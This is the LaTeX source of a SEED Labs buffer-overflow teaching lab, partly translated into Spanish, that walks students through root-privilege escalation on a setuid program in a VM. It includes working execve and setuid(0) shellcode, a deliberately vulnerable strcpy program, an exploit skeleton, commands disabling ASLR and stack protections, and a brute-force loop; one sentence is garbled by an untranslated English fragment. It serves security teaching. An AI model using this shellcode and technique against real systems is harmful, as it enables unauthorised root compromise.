%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  Copyright by Wenliang Du.                                       %%
%%  This work is licensed under the Creative Commons                %%
%%  Attribution-NonCommercial-ShareAlike 4.0 International License. %%
%%  To view a copy of this license, visit                           %%
%%  http://creativecommons.org/licenses/by-nc-sa/4.0/.              %%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\newcommand{\commonfolder}{../../common-files}

\input{\commonfolder/header}
\input{\commonfolder/copyright}


\newcommand{\bufFigs}{./Figs}

\lhead{\bfseries SEED Labs -- Laboratorio de Buffer Overflow (Set-UID Version)}

\def \code#1 {\fbox{\scriptsize{\texttt{#1}}}}

\begin{document}

\begin{center}
{\LARGE Laboratorio de Buffer Overflow (Set-UID Version)}
\end{center}

\seedlabcopyright{2006 - 2020}


% *******************************************
% SECTION
% ******************************************* 
\section{Descripción General}

Un Buffer overflow es un tipo de vulnerabilidad que ocurre cuando un programa intenta escribir una cierta cantidad de datos que sobrepasan los límites permitidos de un buffer de memoria. 
Esta vulnerabilidad puede ser usada por un atacante malicioso para alterar el flujo de control del programa, permitiendo así la ejecución de código malicioso.
El objetivo de este laboratorio es poder estudiar este tipo de vulnerabilidad y aprender a explotarla.


Para este laboratorio, los estudiantes tendrán disponible un programa con una vulnerabilidad de buffer overflow.
La tarea será desarrollar un exploit para explotar el programa y obtener privilegios de root.
A su vez cada uno de los estudiantes podrá experimentar con diferentes tipos de contramedidades que son implementadas para mitigar este tipo de ataques.
Los estudiantes necesitarán evaluar en que situaciones sus ataques serán exitosos y en cuales no, así también explicando el porque de este resultado.
Este laboratorio cubre los siguientes tópicos:


\begin{itemize}[noitemsep]
\item Buffer overflow - Ataques y Vulnerabilidad
\item Stack layout 
\item Address randomization, non-executable stack, and StackGuard
\item Shellcode (32-bits y 64-bits)
\item El ataque return-to-libc, este ataque apunta a evadir la protección non-executable stack y es cubierto en un laboratorio aparte.
\end{itemize}


\paragraph{Lecturas y Videos.}
Para una cobertura más detallada en Ataques de Buffer Overflow puede consultar

\begin{itemize}
\item Capítulo 4 del Libro de SEED, \seedbook
\item Sección 4 del curso de SEED en Udemy, \seedcsvideo
\end{itemize}


\paragraph{Entorno de Laboratorio.} 
\seedenvironmentC


\paragraph{Nota para los instructores.}
Los instructores pueden personalizar este laboratorio modificando los valores para \texttt{L1}, ..., \texttt{L4}. Ver Sección \ref{sec:vulnerable_program} para más detalles.
Dependiendo del conocimiento de los estudiantes y el tiempo asignado al laboratorio, los instructores también pueden hacer opcionales los Levels 2, 3 y 4.
La Tarea del Level 1 es suficiente para cubrir lo básico en cuanto a los ataques buffer overflow. Los Levels del 2 al 4 incrementan la dificultad de estos ataques.
Todas las tareas relacionadas a las contramedidas están ligadas a la tarea del Level 1 por lo tanto saltearse los otros niveles no afecta el abordaje de estas tareas.


% *******************************************
% SECTION
% ******************************************* 
\section{Configuración del Entorno de Laboratorio}

% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Desactivando las Contramedidas}

Los sistemas operativos modernos, implementan diferentes mecanismos de seguridad para dificultar los ataques de buffer overflow.
Para simplificar nuestros ataques, primero necesitamos desactivarlos.
Más adelante los activaremos y veremos si nuestro ataque es exitoso o no.


\paragraph{Address Space Randomization.}
Tanto \ubuntu como otros sistemas basados en Linux implementan una medida de seguridad llamada address space randomization que sirve para randomizar la dirección de memoria inicial en el heap y en el stack. Esto hace que sea difícil determinar las direcciones de memoria de forma exacta; poder calcular las direcciones de memorias es un paso crítico en los ataques de buffer overflow.
Esta contramedida puede ser desactivada usando el siguiente comando:

\begin{lstlisting}
$ sudo sysctl -w kernel.randomize_va_space=0
\end{lstlisting}


\paragraph{Configurando \texttt{/bin/sh}.} En las versiones más recientes de Ubuntu, el link simbólico de \texttt{/bin/sh} apunta a la shell \texttt{/bin/dash}. La shell \texttt{dash} como así \texttt{bash}, tienen implementada una medida de seguridad que evita que se ejecute en un proceso \setuid. Básicamente, si detectan que están siendo ejecuttadas en un proceso \setuid, cambiarán el effective user ID del proceso al real user ID, esto hará que ya no se ejecute con privilegios elevados.


Dado que nuestro programa vulnerable es un programa \setuid y nuestro ataque se basa en correr una shell \texttt{/bin/sh}, la protección anteriormente mencionada hace que nuestro ataque sea más difícil. Lo que haremos será cambiar el link simbólico de \texttt{/bin/sh} a otra shell que no implemente esta medida de protección (en posteriores tareas, mostraremos como evadir esta protección implementada en \texttt{/bin/dash}). En nuestra Máquina Virtual de Ubuntu 20.04 hemos instalado una shell llamada \texttt{zsh}. El siguiente comando puede ser usado para cambiar el link simbólio de \texttt{/bin/sh} hacia \texttt{zsh}:

\begin{lstlisting}
$ sudo ln -sf /bin/zsh /bin/sh
\end{lstlisting}


\paragraph{StackGuard y Non-Executable Stack.} Estas son contramedidas adicionales implementadas por el sistema. Pueden ser desactivadas durante la compilación.
Discutiremos esto al momento de compilar nuestro programa vulnerable.



% *******************************************
% SECTION
% ******************************************* 
\section{Task 1: Shellcode}

El objetivo final de los ataques a las vulnerabilidades de buffer overflow es poder inyectar código malicioso dentro del programa vulnerable, para que así sea ejecutado con los privilegios con que ese programa está corriendo en el sistema.
La pieza de código más usada para para conducir este tipo de ataque de inyección de código en un ataque es llamada Shellcode.
Vamos a adentrarnos un poco en este concepto.


% -------------------------------------------
% SUBSECTION
% -------------------------------------------
\subsection{La versión en C del Shellcode} 

Un Shellcode básicamente es una pieza de código que ejecuta una shell.
Si usamos código en C para implementar, lucirá algo así:

\begin{lstlisting}[language=C]
#include <stdio.h>

int main() {
   char *name[2];

   name[0] = "/bin/sh";
   name[1] = NULL;
   execve(name[0], name, NULL);
}
\end{lstlisting}
 
Desafortunadamente, no podemos compilar este código y usar el binario resultante como nuestro shellcode (para una explicación más en detalle consulte el libro de SEED).
La mejor forma de escribir un shellcode es usar código ensamblador.
En este laboratorio sólo proveemos la versión binaria de un shellcode sin explicar con mucho detalle su funcionamiento. Dado que el funcionamiento de un shellcode está fuera del alcance de este laborattorio, no nos adentraremos en los detalles de su mecánica.
Si está interesado en saber como funciona un shellcode y quiere escribir un shellcode desde cero, puede consultar nuestro laboratorio \textit{Shellcode Lab}


% -------------------------------------------
% SUBSECTION
% -------------------------------------------
\subsection{Shellcode de 32-bits} 


\begin{lstlisting}[language={[x86masm]Assembler}] 
; Store the command on stack
xor  eax, eax
push eax          
push "//sh"
push "/bin"
mov  ebx, esp     ; ebx --> "/bin//sh": execve()'s 1st argument

; Construct the argument array argv[]
push eax          ; argv[1] = 0
push ebx          ; argv[0] --> "/bin//sh"
mov  ecx, esp     ; ecx --> argv[]: execve()'s 2nd argument

; For environment variable 
xor  edx, edx     ; edx = 0: execve()'s 3rd argument

; Invoke execve()
xor  eax, eax     ; 
mov  al,  0x0b    ; execve()'s system call number
int  0x80
\end{lstlisting}

El shellcode anterior invoca a la llamada al sistema \texttt{execve()} para ejecutar \texttt{/bin/sh}. En el laboratorio del Shellcode de SEED explicamos a los estudiantes como escribir un shellcode desde cero. Aquí sólo daremos una pequeña explicación.

\begin{itemize}
\item La tercera instrucción hace push en el stack del parámetro \texttt{"//sh"}, en vez de \texttt{"/sh"}. Esto es porque necesitamos un valor de 32-bits en el stack y \texttt{"/sh"} tiene solamente 24-bits. Afortunadamente \texttt{"//"} es equivalente a \texttt{"/"}, por lo tanto podemos agregar la doble barra sin ningún problema.

\item Necesitamos pasar tres argumentos a {\tt execve()} usando los registros \texttt{ebx}, \texttt{ecx} y \texttt{edx}. La mayoría del shellcode se encarga de construir el contenido con los valores para esos argumentos.

\item La llamada al sistema \texttt{execve()} is invocada cuando se establecer el valor \texttt{0x0b} en \texttt{al} y se ejecuta la instrucción  \texttt{"int 0x80"}.
\end{itemize}
 


% -------------------------------------------
% SUBSECTION
% -------------------------------------------
\subsection{Shellcodede 64-bits} 

A continuación proveemos el mismo shellcode pero es la versión de 64-bits, la única diferencia que existe son los nombres de los registros que se usan para  \texttt{execve()} como así el valor de la llamada al sistema. Se dará una breve explicación en la sección de los comentarios pero no se dará un resumen detallado del shellcode.


\begin{lstlisting}[language={[x86masm]Assembler}]
xor  rdx, rdx        ; rdx = 0: execve()'s 3rd argument
push rdx
mov  rax, '/bin//sh' ; the command we want to run
push rax             ; 
mov  rdi, rsp        ; rdi --> "/bin//sh": execve()'s 1st argument 
push rdx             ; argv[1] = 0
push rdi             ; argv[0] --> "/bin//sh"
mov  rsi, rsp        ; rsi --> argv[]: execve()'s 2nd argument
xor  rax, rax
mov  al,  0x3b       ; execve()'s system call number
syscall              
\end{lstlisting}



% -------------------------------------------
% SUBSECTION
% -------------------------------------------
\subsection{Tarea: Invocando el Shellcode} 

Hemos generados el código binario del shellcode hecho en assembler y hemos puesto ese codigo dentro de un programa hecho en C llamado \texttt{call\_shellcode.c} dentro del directorio \texttt{shellcode}. Si desea aprender como generar el código binario por su cuenta, le recomendamos el laboratorio de Shellcode.
En esta Tarea, haremos un testeo del shellcode.

\begin{lstlisting}[language=C, caption=\texttt{call\_shellcode.c}, label=call_shellcode]
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char shellcode[] =
#if __x86_64__
  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
#else
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
#endif
;

int main(int argc, char **argv)
{
   char code[500];

   strcpy(code, shellcode); // Copy the shellcode to the stack
   int (*func)() = (int(*)())code;
   func();                 // Invoke the shellcode from the stack
   return 1;
} 
\end{lstlisting}

El código mostrado anterior incluye las dos copias del shellcode, la de 32-bits y la de 64-bits. Cuando compilamoos el programa usando el flag 
The code above includes two copies of shellcode, one is 32-bit \texttt{-m32} será usada la versión de 32-bits; si no se usa ese flag será usada la versión de 64-bits. 
Puede usar el código tipeando \texttt{make} esto tomará como referencia el archivo provisto \texttt{Makefile}.
Serán creados dos binarios \texttt{a32.out} (32-bits) y  \texttt{a64.out} (64-bits).
Corralos y describa sus observaciones.
Cabe aclarar que en la compilación se usa la opción \texttt{execstack} que permite que se ejecute código en el stack: sin esta opción el programa fallará.




% *******************************************
% SECTION
% ******************************************* 
\section{Tarea 2: Entendiendo el Programa Vulnerable}
\label{sec:vulnerable_program}

El programa vulnerable que usaremos en este laboratorio se llama \texttt{stack.c} y está ubicado dentro del directorio  \texttt{code}.
Este programa contiene una vulnerabilidad de buffer overflow y es su tarea explotar esta vulnerabilidad y obtener privilegios de root.
El código mostrado a continuación tiene información trivial que fue borrada del archivo original por lo tanto puede notar alguna diferencia entre lo que se muestra acá y el archivo en el directorio.

\begin{lstlisting}[language=C, caption={The vulnerable program (\texttt{stack.c})}]
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* Changing this size will change the layout of the stack.
 * Instructors can change this value each year, so students
 * won't be able to use the solutions from the past. */
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif

int bof(char *str)
{
    char buffer[BUF_SIZE];

    /* The following statement has a buffer overflow problem */ 
    strcpy(buffer, str);          

    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;

    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    bof(str);
    printf("Returned Properly\n");
    return 1;
}
\end{lstlisting}

El programa mostrado anteriormente tiene una vulnerabilidad de buffer overflow. Este recibe el input de un archivo llamado \texttt{badfile}, este input es pasado a un buffer en la función  {\tt bof()}. El input original tiene una longitud máxima de \texttt{517} bytes, pero el buffer en {\tt bof()}  tiene solamente  \texttt{BUF\_SIZE} bytes el cual es menor a \texttt{517}.
Debido a que {\tt strcpy()} no hace un chequeo del tamaño de los datos del input antes que se copien, se dará una condición de buffer overflow.
Dado que este programa tiene como dueño al usuario root y es un programa \setuid, la explotación de la vulnerabilidad de buffer overflow por parte de un usuario no privilegiado, puede usarse para obtener privilegios de root.
Hay que notar que el programa obtiene su input del archivo \texttt{badfile}. Este archivo esta bajo el control del ussuario. Nuestro objetivo será crear el contenido para el archivo \texttt{badfile}, de forma tal que cuando el programa vulnerable copie el contenido de este archivo al buffer, se ejecute una shell con privilegios de root.


\paragraph{Compilación.}
Para poder compilar el programa vulnerable, necesitamos desactivar la protección StackGuard y non-executable stack, para ello debemos usar las opciones \texttt{-fno-stack-protector} y \texttt{-z execstack}.
Después de la compilación, necesitamos darle permisos de dueño al root y hacer \setuid a este programa. Podemos hacer esto haciendo al root dueño del archivo (Línea \ding{192}) y después cambiar los permisos del archivo a \texttt{4755} para activar el bit de \setuid (Línea \ding{193}). Es importante mencionar que antes de activar el bit de \setuid se debe hacer al usuario root dueño del archivo, esto es porque si se hace al revéz el bit de \setuid será reseteado.


\begin{lstlisting}
$ gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c
$ sudo chown root stack          (*@\ding{192}@*)
$ sudo chmod 4755 stack          (*@\ding{193}@*)
\end{lstlisting}

Los comandos de compilación son provistos dentro del archivo \texttt{Makefile}. Para compilar el código, lo único que debe de tipear es \texttt{make}. Las variables \texttt{L1}, \texttt{L2}, \texttt{L3}, y \texttt{L4} dentro del archivo \texttt{Makefile}, serán usadas durante la compilación.
Si el instructor elije cambiar el conjunto de valores para estas variables, puede cambiarlos editando el archivo \texttt{Makefile}.


\paragraph{Para instructores (personalización).}
Para que el laboratorio sea ligeramente diferente al que se ofrecía en el pasado,
los instructores pueden cambiar el valor de \texttt{BUF\_SIZE} solicitando
que los estudiantes compilen el código del servidor usando diferentes valores de \texttt {BUF\_SIZE}.
Dentro del archivo \texttt{Makefile}, el valor de \texttt{BUF\_SIZE} es seteado en 
cuatro variables \texttt{L1}, ..., \texttt{L4}.
Los instructores deben elegir los valores para estas variables en función de
en las siguientes sugerencias:

\begin{itemize}[noitemsep]
\item \texttt{L1}: elegir un valor entre 100 y 400
\item \texttt{L2}: elegir un valor entre 100 y 400
\item \texttt{L3}: elegir un valor entre 100 y 400
\item \texttt{L4}: necesitamos mantener un número más pequeño, se recomienda usar 10 como valor para este level.
\end{itemize}
 


% *******************************************
% SECTION
% *******************************************
\section{Tarea 3: Lanzando el ataque en el Programa de 32-bits (Level 1)}

% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Investigation} 

To exploit the buffer-overflow vulnerability in the target program,
the most important thing to know is the distance between the 
buffer's starting position and the place where the return-address
is stored. We will use a debugging method to find it out.
Since we have the source code of the target program, we
can compile it with the debugging flag turned on. That will make it more
convenient to debug. 

We will add the \texttt{-g} flag to \texttt{gcc} command, so debugging information
is added to the binary. If you run \texttt{make}, the debugging version
is already created. We will use \texttt{gdb} to debug \texttt{stack-L1-dbg}.  
We need to create a file called
\texttt{badfile} before running the program. 


\newcommand{\pointleft}{\reflectbox{\ding{221}}\xspace}

\begin{lstlisting}
$ touch badfile       (*@\pointleft \textbf{Create an empty badfile}@*)
$ gdb stack-L1-dbg
gdb-peda$ b bof       (*@\pointleft \textbf{Set a break point at function bof()}@*)
Breakpoint 1 at 0x124d: file stack.c, line 18.
gdb-peda$ run         (*@\pointleft \textbf{Start executing the program}@*)
...
Breakpoint 1, bof (str=0xffffcf57 ...) at stack.c:18
18  {
gdb-peda$ next        (*@\pointleft \textbf{See the note below}@*)
...
22	    strcpy(buffer, str);
gdb-peda$ p $ebp      (*@\pointleft \textbf{Get the ebp value}@*)
$1 = (void *) 0xffffdfd8   
gdb-peda$ p &buffer   (*@\pointleft \textbf{Get the buffer's address}@*)
$2 = (char (*)[100]) 0xffffdfac
gdb-peda$ quit        (*@\pointleft \textbf{exit}@*)
\end{lstlisting}

\paragraph{Note 1.} When \texttt{gdb} stops inside the \texttt{bof()} function, it 
stops before the \texttt{ebp} register is set
to point to the current stack frame, so if we print out the value of 
\texttt{ebp} here, we will get the caller's \texttt{ebp} value. We need to use 
\texttt{next} to execute a few instructions and stop 
after the \texttt{ebp} register is modified to point to the stack
frame of the \texttt{bof()} function. 
The SEED book is based on Ubuntu 16.04, and \texttt{gdb}'s behavior is slightly
different, so the book does not have the \texttt{next} step. 

\paragraph{Note 2.}
It should be noted that the frame pointer value
obtained from \texttt{gdb} is different from that during the actual
execution (without using \texttt{gdb}). This is because \texttt{gdb}  
has pushed some environment data into the stack before running the debugged program. 
When the program runs directly without using \texttt{gdb},
the stack does not have those data, so the actual frame pointer value 
will be larger. You should keep this in mind when constructing 
your payload. 


% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Lanzando los Ataques} 

To exploit the buffer-overflow vulnerability in the target program,
we need to prepare a payload, and save it inside \texttt{badfile}. 
We will use a Python program to do that.
We provide a skeleton program called \texttt{exploit.py}, which
is included in the lab setup file.
The code is incomplete, and students need to replace some of the essential
values in the code.


\newcommand{\needtochange}{\ding{73} Need to change \ding{73}}


\begin{lstlisting}[language=python, caption={\texttt{exploit.py}}]
#!/usr/bin/python3
import sys

shellcode= (
  ""                    # (*@\needtochange@*)
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
start = 0               # (*@\needtochange@*)
content[start:start + len(shellcode)] = shellcode

# Decide the return address value
# and put it somewhere in the payload
ret    = 0x00           # (*@\needtochange@*)
offset = 0              # (*@\needtochange@*)

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
\end{lstlisting}


After you finish the above program, run it. This will generate
the contents for \texttt{badfile}. Then run the vulnerable 
program {\tt stack}. If your exploit is implemented correctly, you should 
be able to get a root shell:  


\begin{lstlisting}
$./exploit.py     // create the badfile
$./stack-L1       // launch the attack by running the vulnerable program
# <---- Bingo! You've got a root shell! 
\end{lstlisting}

In your lab report, in addition to providing screenshots to demonstrate
your investigation and attack, 
you also need to explain how the values used in your 
\texttt{exploit.py} are decided. These values are the most 
important part of the attack, so a detailed explanation can help
the instructor grade your report. Only demonstrating a successful
attack without explaining why the attack works will not 
receive many points. 



% *******************************************
% SECTION
% *******************************************
\section{Tarea 4: Lanzando el Ataque sin conocer el tamaño del Buffer (Level 2)}

In the Level-1 attack, using \texttt{gdb}, we get to know 
the size of the buffer. In the real world, this piece of information
may be hard to get. For example, if the target is a server program
running on a remote machine, we will not be able to get a copy
of the binary or source code. In this task, we are going to add a 
constraint: you can still use \texttt{gdb}, but you are not allowed
to derive the buffer size from your investigation. Actually, the 
buffer size is provided in \texttt{Makefile}, but you are not allowed
to use that information in your attack.

Your task is to get the vulnerable program to run your shellcode 
under this constraint. We assume that you do know the range of the 
buffer size, which is from 100 to 200 bytes. Another fact that 
may be useful to you is that, due to the memory alignment,
the value stored in the 
frame pointer is always multiple of four (for 32-bit programs). 

Please be noted, you are only allowed
to construct one payload that works for any buffer size
within this range.  You will not get all the credits if you
use the brute-force method, i.e., trying one buffer size
each time. The more you try, the easier it will be detected
and defeated by the victim. That's why minimizing the number
of trials is important for attacks.
In your lab report, you need to describe your method,
and provide evidences. 



% *******************************************
% SECTION
% *******************************************
\section{Tarea 5: Lanzando el ataque en el Programa de 64-bits (Level 3)}

In this task, we will compile the vulnerable program 
into a 64-bit binary called \texttt{stack-L3}.  
We will launch attacks on this program. The compilation and setup
commands are already included in \texttt{Makefile}. Similar to
the previous task, detailed explanation of your attack needs to be provided 
in the lab report. 


Using \texttt{gdb} to conduct an investigation on 64-bit programs 
is the same as that on 32-bit programs.
The only difference is the name of the register for the frame pointer.
In the x86 architecture,
the frame pointer is \texttt{ebp}, while in the x64 architecture,
it is \texttt{rbp}. 


\paragraph{Challenges.} Compared to buffer-overflow attacks on 32-bit
machines, attacks on 64-bit machines is more difficult. The most
difficult part is the address. Although the x64 architecture
supports 64-bit address space, only the address from
\texttt{0x00} through \texttt{0x00007FFFFFFFFFFF} is allowed. That means for
every address (8 bytes), the highest two bytes are always zeros.
This causes a problem.

In our buffer-overflow attacks, we need to store at least one address
in the payload, and the payload will be copied into the stack via
\texttt{strcpy()}. We know that the \texttt{strcpy()} function
will stop copying when it sees a zero. Therefore, if zero
appears in the middle of the payload, the content after the
zero cannot be copied into the stack. How to solve this
problem is the most difficult challenge in this attack.




% *******************************************
% SECTION
% *******************************************
\section{Tarea 6: Lanzando el ataque en el Programa de 64-bits (Level 4)}


The target program (\texttt{stack-L4}) in this task is similar to the one in the Level 2,
except that the buffer size is extremely small. We set the 
buffer size to 10, while in Level 2, the buffer size is much larger. 
Your goal is the same: get the root shell by attacking this \setuid program. 
You may encounter additional challenges in this attack 
due to the small buffer size. 
If that is the case, you need to explain how your have solved 
those challenges in your attack. 



% *******************************************
% SECTION
% ******************************************* 
\section{Tarea 7: Evadiendo la protección \texttt{dash}}

The \texttt{dash} shell in the Ubuntu OS 
drops privileges when it detects that the effective UID does not 
equal to the real UID (which is the case in a \setuid program). 
This is achieved by changing the 
effective UID back to the real UID, essentially, dropping the 
privilege.  In the previous tasks, we let \texttt{/bin/sh} points
to another shell called \texttt{zsh}, which does not have such
a countermeasure. In this task, we will change it back, 
and see how we can defeat the countermeasure. Please 
do the following, so \texttt{/bin/sh} points back to 
\texttt{/bin/dash}. 


\begin{lstlisting}
$ sudo ln -sf /bin/dash /bin/sh
\end{lstlisting}

To defeat the countermeasure in buffer-overflow attacks,
all we need to do is to change the real UID, so it equals the 
effective UID. When a root-owned \setuid program runs, the 
effective UID is zero, so before we invoke the shell program,
we just need to change the real UID to zero.
We can achieve this by invoking \texttt{setuid(0)} before executing 
\texttt{execve()} in the shellcode. 

The following assembly code shows how to invoke
\texttt{setuid(0)}. The binary code is already put inside 
\texttt{call\_shellcode.c}. You just need to add it to the 
beginning of the shellcode. 

\begin{lstlisting}[language={[x86masm]Assembler}]
; Invoke setuid(0): 32-bit
xor ebx, ebx      ; ebx = 0: setuid()'s argument
xor eax, eax
mov  al, 0xd5     ; setuid()'s system call number
int 0x80

; Invoke setuid(0): 64-bit
xor rdi, rdi      ; rdi = 0: setuid()'s argument
xor rax, rax       
mov  al, 0x69     ; setuid()'s system call number
syscall
\end{lstlisting}


\paragraph{Experiment.} Compile \texttt{call\_shellcode.c} into
root-owned binary (by typing \texttt{"make setuid"}). 
Run the shellcode \texttt{a32.out} and \texttt{a64.out} with or without 
the \texttt{setuid(0)} system call. Please describe and explain
your observations. 

\paragraph{Launching the attack again.}
Now, using the updated shellcode, we can attempt the attack 
again on the vulnerable program, and this time, with the 
shell's countermeasure turned on. Repeat your attack
on Level 1, and see whether 
you can get the root shell. After getting the root shell,
please run the following command to prove that the countermeasure
is turned on. Although repeating the attacks on Levels 2 and 3 
are not required, feel free to do that and see whether they work or not.

\begin{lstlisting}
# ls -l /bin/sh /bin/zsh /bin/dash
\end{lstlisting}
 


% *******************************************
% SECTION
% *******************************************
\section{Tarea 8: Evadiendo Address Randomization}

On 32-bit Linux machines, stacks only have 19 bits of entropy, which means the stack base
address can have $2^{19} = 524,288$ possibilities.  This number is not that high and can be
exhausted easily with the brute-force approach. In this task,
we use such an approach to defeat the address randomization countermeasure 
on our 32-bit VM. 
First, we turn on the Ubuntu's address randomization using the 
following command. Then we run the same attack
against \texttt{stack-L1}.
Please describe and explain your observation.

\begin{lstlisting}
$ sudo /sbin/sysctl -w kernel.randomize_va_space=2
\end{lstlisting}


We then use the brute-force approach to attack the vulnerable program repeatedly, hoping that 
the address we put in the \texttt{badfile} can eventually be correct. We will only try
this on \texttt{stack-L1}, which is a 32-bit program. 
You can use the following shell script to run the vulnerable program in an infinite loop. If your
attack succeeds, the script will stop; otherwise, it will keep running. Please be patient,
as this may take a few minutes, but if you are very unlucky,
it may take longer. Please describe your observation.


\begin{lstlisting}[language=bash]
#!/bin/bash

SECONDS=0
value=0

while true; do
  value=$(( $value + 1 ))
  duration=$SECONDS
  min=$(($duration / 60))
  sec=$(($duration % 60))
  echo "$min minutes and $sec seconds elapsed."
  echo "The program has been running $value times so far."
  ./stack-L1
done
\end{lstlisting}


Brute-force attacks on 64-bit programs is much harder, because the entropy
is much larger. Although this is not required, free free to try it just for fun. 
Let it run overnight. Who knows, you may be very lucky. 


% *******************************************
% SECTION
% ******************************************* 
\section{Tareas 9: Experimentando con otras Contramedidas}


% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Tarea 9.a: Activando StackGuard}

Muchos compiladores como \texttt{gcc} implementan un mecanismo de seguridad llamado \textit{StackGuard} esta protección está destinada a prevenir ataques a programas con vulnerabilidades de buffer overflow. Los programas vulnerables que hemos estado usando tienen esta protección desactivada. 
En esta tarea, la activaremos para ver que es lo que pasa.

First, repeat the Level-1 attack with the StackGuard off, and make sure that the
attack is still successful. Remember to turn off the address randomization, because
you have turned it on in the previous task.
Then, we turn on the StackGuard protection by
recompiling the vulnerable \texttt{stack.c} program without the
\texttt{-fno-stack-protector} flag.
In \texttt{gcc} version 4.3.3 and above, StackGuard is enabled by
default. Launch the attack; report and explain your observations.



% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Tarea 9.b: Activando la Protección Non-executable Stack}

\input{part_nonexecutable_stack}



% *******************************************
% SECTION
% *******************************************
\section{Submission}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\input{\commonfolder/submission}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


% *******************************************
% SECTION
% *******************************************
\section*{Agradecimientos}

\input{\commonfolder/acknowledgments}

\end{document}
